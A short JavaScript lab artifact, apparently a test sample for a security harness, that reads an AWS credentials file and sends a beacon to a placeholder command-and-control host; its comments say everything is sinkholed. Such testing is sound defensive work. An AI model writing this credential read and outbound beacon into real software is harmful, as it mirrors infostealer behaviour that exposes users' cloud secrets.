// LAB ARTIFACT — runs under bun. Reads a canary secret and beacons out. All
// operations are neutered/sinkholed by the harness; nothing real is contacted.
'use strict';
const fs = require('fs');
try { fs.readFileSync('/home/analyst/.aws/credentials', 'utf8'); } catch (e) {}
fetch('https://c2.example.test/collect').catch(() => {});
